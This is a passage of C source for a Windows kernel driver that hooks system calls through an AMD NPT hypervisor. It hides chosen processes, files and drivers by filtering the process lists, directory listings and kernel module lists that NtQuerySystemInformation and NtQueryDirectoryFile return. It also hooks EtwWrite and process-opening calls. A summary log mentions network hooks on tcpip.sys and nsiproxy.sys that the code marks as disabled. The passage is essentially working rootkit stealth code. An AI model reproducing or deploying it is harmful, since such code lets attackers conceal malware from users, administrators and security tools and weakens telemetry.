    // NtDeviceIoControlFile Hook 暂时禁用 - NPT Hook 此函数导致系统不稳定
    // ============================================================
    /*
    {
        PVOID ntDeviceIoControlFile;
        RtlInitUnicodeString(&funcName, L"NtDeviceIoControlFile");
        ntDeviceIoControlFile = MmGetSystemRoutineAddress(&funcName);
        
        if (ntDeviceIoControlFile && g_NptNtDeviceIoControlFileHook == NULL) {
            DbgPrint("[NPT-Hook] NtDeviceIoControlFile at %p\n", ntDeviceIoControlFile);
            
            status = NptHookInstall(ntDeviceIoControlFile, NptHookedNtDeviceIoControlFile, &g_NptNtDeviceIoControlFileHook);
            if (NT_SUCCESS(status)) {
                g_NptOriginalNtDeviceIoControlFile = (PFN_NptNtDeviceIoControlFile)NptHookGetTrampoline(g_NptNtDeviceIoControlFileHook);
                DbgPrint("[NPT-Hook] NtDeviceIoControlFile hook installed\n");
            } else {
                DbgPrint("[NPT-Hook] NtDeviceIoControlFile hook failed: 0x%X\n", status);
            }
        }
    }
    */
    DbgPrint("[NPT-Hook] Network connection hiding disabled - requires WFP/NDIS filter driver\n");
    
    // ============================================================
    // 底层网络驱动 Hook 暂时禁用 - 可能导致系统不稳定
    // ============================================================
    // DbgPrint("[NPT-Hook] Installing low-level network driver hooks...\n");
    // NptInstallNetworkDriverHooks();  // 暂时禁用
    
    DbgPrint("[NPT-Hook] ============ NptHookHideProcess END ============\n");
    DbgPrint("[NPT-Hook] Process hiding hooks summary:\n");
    DbgPrint("[NPT-Hook]   - NtQuerySystemInformation: %s\n", g_NptNtQuerySystemInformationHook ? "OK" : "FAILED");
    DbgPrint("[NPT-Hook]   - NtGetNextProcess: %s\n", g_NptNtGetNextProcessHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - NtGetNextThread: %s\n", g_NptNtGetNextThreadHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - NtOpenProcess: %s\n", g_NptNtOpenProcessHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - EtwWrite: %s\n", g_NptEtwWriteHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - NtDeviceIoControlFile: %s\n", g_NptNtDeviceIoControlFileHook ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - tcpip.sys hook: %s\n", g_NptTcpipDriverObject ? "OK" : "N/A");
    DbgPrint("[NPT-Hook]   - nsiproxy.sys hook: %s\n", g_NptNsiproxyDriverObject ? "OK" : "N/A");
    
    return STATUS_SUCCESS;
}

NTSTATUS
NptHookHideProcessByName(
    _In_ PCWSTR ProcessName
)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;
    ULONG returnLength = 0;
    PNPT_SYSTEM_PROCESS_INFO current;
    ULONG foundCount = 0;
    UNICODE_STRING targetName;
    
    if (!ProcessName || ProcessName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlInitUnicodeString(&targetName, ProcessName);
    
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, 'kpNH');
        if (!buffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 走 trampoline 跳过我们自己安装的 hook,避免 hide-by-name 被自己过滤
        status = g_NptOriginalNtQuerySystemInformation
            ? g_NptOriginalNtQuerySystemInformation(5, buffer, bufferSize, &returnLength)
            : ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, 'kpNH');
            buffer = NULL;
            bufferSize = returnLength + 0x1000;
            if (bufferSize > 0x1000000) {
                return STATUS_INSUFFICIENT_RESOURCES;
            }
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            HvFreePoolNonNull(buffer, 'kpNH');
            return status;
        }
        
        break;
    }
    
    __try {
        current = (PNPT_SYSTEM_PROCESS_INFO)buffer;
        
        while (TRUE) {
            if (current->ImageName.Buffer != NULL && 
                current->ImageName.Length > 0 &&
                RtlCompareUnicodeString(&current->ImageName, &targetName, TRUE) == 0) {
                
                ULONG processId = (ULONG)(ULONG_PTR)current->UniqueProcessId;
                
                status = NptHookHideProcess(processId);
                if (NT_SUCCESS(status)) {
                    foundCount++;
                }
            }
            
            if (current->NextEntryOffset == 0) break;
            current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    if (buffer) {
        ExFreePoolWithTag(buffer, 'kpNH');
    }
    
    if (foundCount == 0) {
        return STATUS_NOT_FOUND;
    }
    
    return STATUS_SUCCESS;
}

NTSTATUS
NptHookUnhideProcessByName(
    _In_ PCWSTR ProcessName
)
{
    NTSTATUS status;
    PVOID buffer = NULL;
    ULONG bufferSize = 0x10000;
    ULONG returnLength = 0;
    PNPT_SYSTEM_PROCESS_INFO current;
    ULONG foundCount = 0;
    UNICODE_STRING targetName;
    
    if (!ProcessName || ProcessName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    RtlInitUnicodeString(&targetName, ProcessName);
    
    while (TRUE) {
        buffer = HvAllocateNonPaged(bufferSize, 'kpNH');
        if (!buffer) {
            return STATUS_INSUFFICIENT_RESOURCES;
        }
        
        // 走 trampoline,绕开自己装的 hook —— 否则 unhide-by-name 永远 NOT_FOUND
        status = g_NptOriginalNtQuerySystemInformation
            ? g_NptOriginalNtQuerySystemInformation(5, buffer, bufferSize, &returnLength)
            : ZwQuerySystemInformation(5, buffer, bufferSize, &returnLength);

        if (status == STATUS_INFO_LENGTH_MISMATCH) {
            HvFreePoolNonNull(buffer, 'kpNH');
            buffer = NULL;
            bufferSize = returnLength + 0x1000;
            continue;
        }
        
        if (!NT_SUCCESS(status)) {
            HvFreePoolNonNull(buffer, 'kpNH');
            return status;
        }
        break;
    }
    
    __try {
        current = (PNPT_SYSTEM_PROCESS_INFO)buffer;
        
        while (TRUE) {
            if (current->ImageName.Buffer != NULL &&
                RtlCompareUnicodeString(&current->ImageName, &targetName, TRUE) == 0) {
                
                status = NptHookUnhideProcess((ULONG)(ULONG_PTR)current->UniqueProcessId);
                if (NT_SUCCESS(status)) {
                    foundCount++;
                }
            }
            
            if (current->NextEntryOffset == 0) break;
            current = (PNPT_SYSTEM_PROCESS_INFO)((PUCHAR)current + current->NextEntryOffset);
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
    
    if (buffer) {
        ExFreePoolWithTag(buffer, 'kpNH');
    }
    
    return (foundCount > 0) ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS
NptHookUnhideProcess(
    _In_ ULONG ProcessId
)
{
    KIRQL oldIrql;
    ULONG i;
    BOOLEAN found = FALSE;
    
    if (ProcessId == 0) {
        return STATUS_INVALID_PARAMETER;
    }
    
    KeAcquireSpinLock(&g_NptHiddenProcessLock, &oldIrql);
    
    for (i = 0; i < g_NptHiddenProcessCount && i < MAX_HIDDEN_PROCESSES; i++) {
        if (g_NptHiddenProcessIds[i] == ProcessId) {
            ULONG j;
            for (j = i; j < g_NptHiddenProcessCount - 1 && j < MAX_HIDDEN_PROCESSES - 1; j++) {
                g_NptHiddenProcessIds[j] = g_NptHiddenProcessIds[j + 1];
            }
            g_NptHiddenProcessIds[g_NptHiddenProcessCount - 1] = 0;
            g_NptHiddenProcessCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenProcessLock, oldIrql);
    
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

// ============================================================
// 高级功能：文件隐藏 (AMD NPT)
// ============================================================

// 注意: MAX_NPT_HIDDEN_FILES, MAX_NPT_FILE_NAME_LEN 和 g_NptHiddenFile* 变量已在文件开头定义

// NtQueryDirectoryFile Hook
static PNPT_HOOK_ENTRY g_NptQueryDirFileHook = NULL;

typedef NTSTATUS (NTAPI *PFN_NptNtQueryDirectoryFile)(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan
);

static PFN_NptNtQueryDirectoryFile g_NptOriginalQueryDirFile = NULL;

// 文件信息结构
typedef struct _NPT_FILE_DIR_INFO {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    WCHAR FileName[1];
} NPT_FILE_DIR_INFO, *PNPT_FILE_DIR_INFO;

typedef struct _NPT_FILE_BOTH_DIR_INFO {
    ULONG NextEntryOffset;
    ULONG FileIndex;
    LARGE_INTEGER CreationTime;
    LARGE_INTEGER LastAccessTime;
    LARGE_INTEGER LastWriteTime;
    LARGE_INTEGER ChangeTime;
    LARGE_INTEGER EndOfFile;
    LARGE_INTEGER AllocationSize;
    ULONG FileAttributes;
    ULONG FileNameLength;
    ULONG EaSize;
    CCHAR ShortNameLength;
    WCHAR ShortName[12];
    WCHAR FileName[1];
} NPT_FILE_BOTH_DIR_INFO, *PNPT_FILE_BOTH_DIR_INFO;

static BOOLEAN
NptIsFileNameHidden(
    _In_ PCWSTR FileName,
    _In_ ULONG FileNameLength
)
{
    ULONG i;
    WCHAR tempName[MAX_NPT_FILE_NAME_LEN];
    ULONG charCount;
    KIRQL oldIrql;
    BOOLEAN result = FALSE;
    
    if (!FileName || FileNameLength == 0 || g_NptHiddenFileCount == 0) {
        return FALSE;
    }
    
    charCount = FileNameLength / sizeof(WCHAR);
    if (charCount >= MAX_NPT_FILE_NAME_LEN) {
        charCount = MAX_NPT_FILE_NAME_LEN - 1;
    }
    
    RtlCopyMemory(tempName, FileName, charCount * sizeof(WCHAR));
    tempName[charCount] = L'\0';
    
    if (g_NptHiddenFileLockInit) {
        KeAcquireSpinLock(&g_NptHiddenFileLock, &oldIrql);
    }
    
    for (i = 0; i < g_NptHiddenFileCount && i < MAX_NPT_HIDDEN_FILES; i++) {
        if (_wcsicmp(g_NptHiddenFileNames[i], tempName) == 0) {
            result = TRUE;
            break;
        }
    }
    
    if (g_NptHiddenFileLockInit) {
        KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
    }
    
    return result;
}

static VOID
NptFilterDirectoryInfo(
    _In_ PVOID FileInfo,
    _In_ FILE_INFORMATION_CLASS InfoClass
)
{
    PVOID current = FileInfo;
    PVOID previous = NULL;
    
    if (!FileInfo || g_NptHiddenFileCount == 0) {
        return;
    }
    
    __try {
        while (current) {
            ULONG nextOffset = 0;
            PWCHAR fileName = NULL;
            ULONG fileNameLength = 0;
            BOOLEAN shouldHide = FALSE;
            
            switch (InfoClass) {
                case FileDirectoryInformation:
                    nextOffset = ((PNPT_FILE_DIR_INFO)current)->NextEntryOffset;
                    fileName = ((PNPT_FILE_DIR_INFO)current)->FileName;
                    fileNameLength = ((PNPT_FILE_DIR_INFO)current)->FileNameLength;
                    break;
                case FileBothDirectoryInformation:
                    nextOffset = ((PNPT_FILE_BOTH_DIR_INFO)current)->NextEntryOffset;
                    fileName = ((PNPT_FILE_BOTH_DIR_INFO)current)->FileName;
                    fileNameLength = ((PNPT_FILE_BOTH_DIR_INFO)current)->FileNameLength;
                    break;
                default:
                    return;
            }
            
            shouldHide = NptIsFileNameHidden(fileName, fileNameLength);
            
            if (shouldHide && previous) {
                ULONG* prevNext = NULL;
                switch (InfoClass) {
                    case FileDirectoryInformation:
                        prevNext = &((PNPT_FILE_DIR_INFO)previous)->NextEntryOffset;
                        break;
                    case FileBothDirectoryInformation:
                        prevNext = &((PNPT_FILE_BOTH_DIR_INFO)previous)->NextEntryOffset;
                        break;
                }
                
                if (prevNext) {
                    if (nextOffset == 0) {
                        *prevNext = 0;
                    } else {
                        *prevNext += nextOffset;
                    }
                }
                
                if (nextOffset == 0) break;
                current = (PUCHAR)current + nextOffset;
                continue;
            }
            
            previous = current;
            if (nextOffset == 0) break;
            current = (PUCHAR)current + nextOffset;
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
    }
}

NTSTATUS
NTAPI
NptHookedNtQueryDirectoryFile(
    _In_ HANDLE FileHandle,
    _In_opt_ HANDLE Event,
    _In_opt_ PIO_APC_ROUTINE ApcRoutine,
    _In_opt_ PVOID ApcContext,
    _Out_ PIO_STATUS_BLOCK IoStatusBlock,
    _Out_ PVOID FileInformation,
    _In_ ULONG Length,
    _In_ FILE_INFORMATION_CLASS FileInformationClass,
    _In_ BOOLEAN ReturnSingleEntry,
    _In_opt_ PUNICODE_STRING FileName,
    _In_ BOOLEAN RestartScan
)
{
    NTSTATUS status;
    
    if (!g_NptOriginalQueryDirFile) {
        return STATUS_UNSUCCESSFUL;
    }
    
    __try {
        status = g_NptOriginalQueryDirFile(
            FileHandle, Event, ApcRoutine, ApcContext,
            IoStatusBlock, FileInformation, Length,
            FileInformationClass, ReturnSingleEntry,
            FileName, RestartScan
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    if (NT_SUCCESS(status) && FileInformation && g_NptHiddenFileCount > 0) {
        NptFilterDirectoryInfo(FileInformation, FileInformationClass);
    }
    
    return status;
}

NTSTATUS
NptHookHideFile(
    _In_ PCWSTR FileName
)
{
    KIRQL oldIrql;
    PCWSTR baseName;
    SIZE_T len;
    
    if (!FileName) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 检查锁是否已初始化（应该在 NptHookInitialize 中已初始化）
    if (!g_NptHiddenFileLockInit) {
        DbgPrint("[NPT-Hook] Warning: File hide lock not initialized\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    baseName = wcsrchr(FileName, L'\\');
    if (baseName) baseName++; else baseName = FileName;
    
    len = wcslen(baseName);
    if (len == 0 || len >= MAX_NPT_FILE_NAME_LEN) {
        return STATUS_INVALID_PARAMETER;
    }
    
    KeAcquireSpinLock(&g_NptHiddenFileLock, &oldIrql);
    
    for (ULONG i = 0; i < g_NptHiddenFileCount && i < MAX_NPT_HIDDEN_FILES; i++) {
        if (_wcsicmp(g_NptHiddenFileNames[i], baseName) == 0) {
            KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
            return STATUS_SUCCESS;
        }
    }
    
    if (g_NptHiddenFileCount < MAX_NPT_HIDDEN_FILES) {
        wcscpy_s(g_NptHiddenFileNames[g_NptHiddenFileCount], MAX_NPT_FILE_NAME_LEN, baseName);
        g_NptHiddenFileCount++;
        KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
    return STATUS_INSUFFICIENT_RESOURCES;
}

NTSTATUS
NptHookUnhideFile(
    _In_ PCWSTR FileName
)
{
    KIRQL oldIrql;
    PCWSTR baseName;
    BOOLEAN found = FALSE;
    
    if (!FileName || !g_NptHiddenFileLockInit) {
        return STATUS_INVALID_PARAMETER;
    }
    
    baseName = wcsrchr(FileName, L'\\');
    if (baseName) baseName++; else baseName = FileName;
    
    KeAcquireSpinLock(&g_NptHiddenFileLock, &oldIrql);
    
    for (ULONG i = 0; i < g_NptHiddenFileCount && i < MAX_NPT_HIDDEN_FILES; i++) {
        if (_wcsicmp(g_NptHiddenFileNames[i], baseName) == 0) {
            for (ULONG j = i; j < g_NptHiddenFileCount - 1; j++) {
                wcscpy_s(g_NptHiddenFileNames[j], MAX_NPT_FILE_NAME_LEN, g_NptHiddenFileNames[j + 1]);
            }
            g_NptHiddenFileNames[g_NptHiddenFileCount - 1][0] = L'\0';
            g_NptHiddenFileCount--;
            found = TRUE;
            break;
        }
    }
    
    KeReleaseSpinLock(&g_NptHiddenFileLock, oldIrql);
    return found ? STATUS_SUCCESS : STATUS_NOT_FOUND;
}

NTSTATUS
NptHookInstallFileHideHook(VOID)
{
    NTSTATUS status;
    UNICODE_STRING funcName;
    PVOID ntQueryDirFile;
    
    // 检查锁是否已初始化
    if (!g_NptHiddenFileLockInit) {
        DbgPrint("[NPT-Hook] Warning: File hide lock not initialized\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    if (g_NptQueryDirFileHook != NULL) {
        return STATUS_SUCCESS;
    }
    
    RtlInitUnicodeString(&funcName, L"NtQueryDirectoryFile");
    ntQueryDirFile = MmGetSystemRoutineAddress(&funcName);
    
    if (!ntQueryDirFile) {
        return STATUS_NOT_FOUND;
    }
    
    status = NptHookInstall(
        ntQueryDirFile,
        NptHookedNtQueryDirectoryFile,
        &g_NptQueryDirFileHook
    );
    
    if (NT_SUCCESS(status)) {
        g_NptOriginalQueryDirFile = 
            (PFN_NptNtQueryDirectoryFile)NptHookGetTrampoline(g_NptQueryDirFileHook);
    }
    
    return status;
}

NTSTATUS
NptHookRemoveFileHideHook(VOID)
{
    if (g_NptQueryDirFileHook) {
        NptHookRemove(g_NptQueryDirFileHook);
        g_NptQueryDirFileHook = NULL;
        g_NptOriginalQueryDirFile = NULL;
    }
    return STATUS_SUCCESS;
}

// ============================================================
// 驱动隐藏功能 (AMD NPT)
// ============================================================

// 驱动隐藏相关全局变量
#define MAX_NPT_HIDDEN_DRIVERS 32
#define MAX_NPT_DRIVER_NAME_LEN 128

static WCHAR g_NptHiddenDriverNames[MAX_NPT_HIDDEN_DRIVERS][MAX_NPT_DRIVER_NAME_LEN];
static WCHAR g_NptHiddenDriverServiceNames[MAX_NPT_HIDDEN_DRIVERS][MAX_NPT_DRIVER_NAME_LEN];
static PVOID g_NptHiddenDriverBases[MAX_NPT_HIDDEN_DRIVERS];
static ULONG g_NptHiddenDriverSizes[MAX_NPT_HIDDEN_DRIVERS];
static ULONG g_NptHiddenDriverCount = 0;
static KSPIN_LOCK g_NptHiddenDriverLock;
static volatile LONG g_NptHiddenDriverLockInit = 0;

// 驱动隐藏 Hook 句柄
static PNPT_HOOK_ENTRY g_NptDriverQueryHook = NULL;

// 原始 ZwQuerySystemInformation (用于驱动隐藏)
static PFN_NptNtQuerySystemInformation g_NptOriginalQueryForDrivers = NULL;

// RTL_PROCESS_MODULE_INFORMATION 已在 HvTypes.h 中定义
// 使用别名保持兼容性
typedef HV_RTL_PROCESS_MODULE_INFORMATION NPT_RTL_PROCESS_MODULE_INFORMATION;
typedef PHV_RTL_PROCESS_MODULE_INFORMATION PNPT_RTL_PROCESS_MODULE_INFORMATION;
typedef HV_RTL_PROCESS_MODULES NPT_RTL_PROCESS_MODULES;
typedef PHV_RTL_PROCESS_MODULES PNPT_RTL_PROCESS_MODULES;

/*
 * 检查驱动是否应该被隐藏（通过基址）
 */
static BOOLEAN
NptIsDriverHidden(
    _In_ PVOID DriverBase
)
{
    if (g_NptHiddenDriverCount == 0 || !g_NptHiddenDriverLockInit) {
        return FALSE;
    }
    
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (g_NptHiddenDriverBases[i] == DriverBase) {
            return TRUE;
        }
    }
    
    return FALSE;
}

/*
 * 检查驱动是否应该被隐藏（通过名称）
 */
static BOOLEAN
NptIsDriverNameHidden(
    _In_ PCSTR DriverName
)
{
    ANSI_STRING ansiName;
    UNICODE_STRING uniName;
    WCHAR uniBuffer[MAX_NPT_DRIVER_NAME_LEN];
    NTSTATUS status;
    
    if (g_NptHiddenDriverCount == 0 || !DriverName || !g_NptHiddenDriverLockInit) {
        return FALSE;
    }
    
    RtlInitAnsiString(&ansiName, DriverName);
    uniName.Buffer = uniBuffer;
    uniName.Length = 0;
    uniName.MaximumLength = sizeof(uniBuffer);
    
    status = RtlAnsiStringToUnicodeString(&uniName, &ansiName, FALSE);
    if (!NT_SUCCESS(status)) {
        return FALSE;
    }
    
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (_wcsicmp(g_NptHiddenDriverNames[i], uniBuffer) == 0) {
            return TRUE;
        }
    }
    
    return FALSE;
}

/*
 * 过滤模块列表（驱动隐藏）
 */
static VOID
NptFilterModuleList(
    _Inout_ PNPT_RTL_PROCESS_MODULES ModuleInfo
)
{
    ULONG originalCount;
    ULONG newCount = 0;
    ULONG i;
    
    if (!ModuleInfo || ModuleInfo->NumberOfModules == 0) {
        return;
    }
    
    originalCount = ModuleInfo->NumberOfModules;
    
    __try {
        for (i = 0; i < originalCount; i++) {
            PNPT_RTL_PROCESS_MODULE_INFORMATION module = &ModuleInfo->Modules[i];
            PCSTR fileName = (PCSTR)(module->FullPathName + module->OffsetToFileName);
            
            // 检查是否需要隐藏
            if (NptIsDriverHidden(module->ImageBase) || NptIsDriverNameHidden(fileName)) {
                // 跳过这个模块
                continue;
            }
            
            // 如果需要移动条目
            if (newCount != i) {
                RtlCopyMemory(&ModuleInfo->Modules[newCount], module, 
                    sizeof(NPT_RTL_PROCESS_MODULE_INFORMATION));
            }
            newCount++;
        }
        
        ModuleInfo->NumberOfModules = newCount;
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        DbgPrint("[NPT-Hook] Exception in NptFilterModuleList\n");
    }
}

/*
 * Hooked ZwQuerySystemInformation 用于驱动隐藏
 */
static NTSTATUS
NTAPI
NptHookedQueryForDrivers(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status;
    PFN_NptNtQuerySystemInformation originalFunc;
    
    originalFunc = g_NptOriginalQueryForDrivers;
    if (!originalFunc) {
        // 回退到使用进程隐藏的原始函数
        originalFunc = g_NptOriginalNtQuerySystemInformation;
        if (!originalFunc) {
            return STATUS_UNSUCCESSFUL;
        }
    }
    
    __try {
        status = originalFunc(
            SystemInformationClass,
            SystemInformation,
            SystemInformationLength,
            ReturnLength
        );
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        return GetExceptionCode();
    }
    
    // SystemModuleInformation = 11
    if (NT_SUCCESS(status) && SystemInformationClass == 11 && 
        SystemInformation != NULL && g_NptHiddenDriverCount > 0) {
        
        __try {
            NptFilterModuleList((PNPT_RTL_PROCESS_MODULES)SystemInformation);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    
    // 也处理进程隐藏 (SystemProcessInformation = 5)
    if (NT_SUCCESS(status) && SystemInformationClass == 5 && 
        SystemInformation != NULL && g_NptHiddenProcessCount > 0) {
        
        __try {
            NptFilterProcessList(SystemInformation);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {
        }
    }
    
    return status;
}

/*
 * 安装驱动隐藏 Hook
 */
NTSTATUS
NptHookInstallDriverHideHook(VOID)
{
    NTSTATUS status;
    UNICODE_STRING funcName;
    PVOID ntQuerySystemInformation;
    
    DbgPrint("[NPT-Hook] Installing Driver Hide Hook...\n");
    
    // 初始化锁
    if (InterlockedCompareExchange(&g_NptHiddenDriverLockInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_NptHiddenDriverLock);
    }
    
    // 如果进程隐藏 Hook 已安装，共享它
    if (g_NptNtQuerySystemInformationHook != NULL) {
        DbgPrint("[NPT-Hook] Using existing NtQuerySystemInformation hook for driver hiding\n");
        return STATUS_SUCCESS;
    }
    
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[NPT-Hook] Hypervisor not active\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    RtlInitUnicodeString(&funcName, L"NtQuerySystemInformation");
    ntQuerySystemInformation = MmGetSystemRoutineAddress(&funcName);
    
    if (!ntQuerySystemInformation) {
        DbgPrint("[NPT-Hook] Failed to find NtQuerySystemInformation\n");
        return STATUS_NOT_FOUND;
    }
    
    DbgPrint("[NPT-Hook] NtQuerySystemInformation at %p\n", ntQuerySystemInformation);
    
    // 安装 Hook
    status = NptHookInstall(
        ntQuerySystemInformation,
        NptHookedQueryForDrivers,
        &g_NptDriverQueryHook
    );
    
    if (NT_SUCCESS(status)) {
        g_NptOriginalQueryForDrivers = 
            (PFN_NptNtQuerySystemInformation)NptHookGetTrampoline(g_NptDriverQueryHook);
        
        DbgPrint("[NPT-Hook] Driver hide hook installed, trampoline at %p\n", 
            g_NptOriginalQueryForDrivers);
    } else {
        DbgPrint("[NPT-Hook] Driver hide hook installation failed: 0x%X\n", status);
    }
    
    return status;
}

/*
 * 移除驱动隐藏 Hook
 */
NTSTATUS
NptHookRemoveDriverHideHook(VOID)
{
    DbgPrint("[NPT-Hook] Removing Driver Hide Hook...\n");
    
    if (g_NptDriverQueryHook) {
        NptHookRemove(g_NptDriverQueryHook);
        g_NptDriverQueryHook = NULL;
        g_NptOriginalQueryForDrivers = NULL;
    }
    
    return STATUS_SUCCESS;
}

/*
 * 隐藏指定驱动
 */
NTSTATUS
NptHookHideDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    KIRQL oldIrql;
    UNICODE_STRING driverName;
    PKLDR_DATA_TABLE_ENTRY entry;
    PVOID driverBase;
    ULONG driverSize;
    
    if (!DriverObject) {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 初始化锁
    if (InterlockedCompareExchange(&g_NptHiddenDriverLockInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_NptHiddenDriverLock);
    }
    
    // 获取驱动信息
    entry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) {
        DbgPrint("[NPT-Hook] Failed to get driver section\n");
        return STATUS_UNSUCCESSFUL;
    }
    
    driverBase = entry->DllBase;
    driverSize = entry->SizeOfImage;
    driverName = entry->BaseDllName;
    
    DbgPrint("[NPT-Hook] Hiding driver: %wZ at %p (size: 0x%X)\n", 
        &driverName, driverBase, driverSize);
    
    KeAcquireSpinLock(&g_NptHiddenDriverLock, &oldIrql);
    
    // 检查是否已经隐藏
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (g_NptHiddenDriverBases[i] == driverBase) {
            KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
            DbgPrint("[NPT-Hook] Driver already hidden\n");
            return STATUS_SUCCESS;
        }
    }
    
    // 添加到隐藏列表
    if (g_NptHiddenDriverCount < MAX_NPT_HIDDEN_DRIVERS) {
        ULONG index = g_NptHiddenDriverCount;
        
        g_NptHiddenDriverBases[index] = driverBase;
        g_NptHiddenDriverSizes[index] = driverSize;
        
        if (driverName.Buffer && driverName.Length > 0) {
            SIZE_T copyLen = min(driverName.Length / sizeof(WCHAR), MAX_NPT_DRIVER_NAME_LEN - 1);
            RtlCopyMemory(g_NptHiddenDriverNames[index], driverName.Buffer, copyLen * sizeof(WCHAR));
            g_NptHiddenDriverNames[index][copyLen] = L'\0';
        }
        
        g_NptHiddenDriverCount++;
        
        KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
        
        DbgPrint("[NPT-Hook] Driver added to hidden list (total: %d)\n", g_NptHiddenDriverCount);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
    return STATUS_INSUFFICIENT_RESOURCES;
}

/*
 * 根据名称隐藏驱动
 */
NTSTATUS
NptHookHideDriverByName(
    _In_ PCWSTR DriverName
)
{
    KIRQL oldIrql;
    SIZE_T len;
    
    if (!DriverName || DriverName[0] == L'\0') {
        return STATUS_INVALID_PARAMETER;
    }
    
    // 初始化锁
    if (InterlockedCompareExchange(&g_NptHiddenDriverLockInit, 1, 0) == 0) {
        KeInitializeSpinLock(&g_NptHiddenDriverLock);
    }
    
    len = wcslen(DriverName);
    if (len >= MAX_NPT_DRIVER_NAME_LEN) {
        return STATUS_INVALID_PARAMETER;
    }
    
    DbgPrint("[NPT-Hook] Hiding driver by name: %ws\n", DriverName);
    
    KeAcquireSpinLock(&g_NptHiddenDriverLock, &oldIrql);
    
    // 检查是否已经隐藏
    for (ULONG i = 0; i < g_NptHiddenDriverCount && i < MAX_NPT_HIDDEN_DRIVERS; i++) {
        if (_wcsicmp(g_NptHiddenDriverNames[i], DriverName) == 0) {
            KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
            return STATUS_SUCCESS;
        }
    }
    
    // 添加到隐藏列表
    if (g_NptHiddenDriverCount < MAX_NPT_HIDDEN_DRIVERS) {
        ULONG index = g_NptHiddenDriverCount;
        
        wcscpy_s(g_NptHiddenDriverNames[index], MAX_NPT_DRIVER_NAME_LEN, DriverName);
        g_NptHiddenDriverBases[index] = NULL;  // 将在实际查询时匹配
        g_NptHiddenDriverSizes[index] = 0;
        
        g_NptHiddenDriverCount++;
        
        KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
        return STATUS_SUCCESS;
    }
    
    KeReleaseSpinLock(&g_NptHiddenDriverLock, oldIrql);
    return STATUS_INSUFFICIENT_RESOURCES;
}

/*
 * 取消隐藏指定驱动
 */
NTSTATUS
NptHookUnhideDriver(
    _In_ PDRIVER_OBJECT DriverObject
)
{
    KIRQL oldIrql;
    PKLDR_DATA_TABLE_ENTRY entry;
    PVOID driverBase;
    BOOLEAN found = FALSE;
    
    if (!DriverObject || !g_NptHiddenDriverLockInit) {
        return STATUS_INVALID_PARAMETER;
    }
    
    entry = (PKLDR_DATA_TABLE_ENTRY)DriverObject->DriverSection;
    if (!entry) {
        return STATUS_UNSUCCESSFUL;
    }
    
    driverBase = entry->DllBase;
    
    KeAcquireSpinLock(&g_NptHiddenDriverLock, &oldIrql);
    
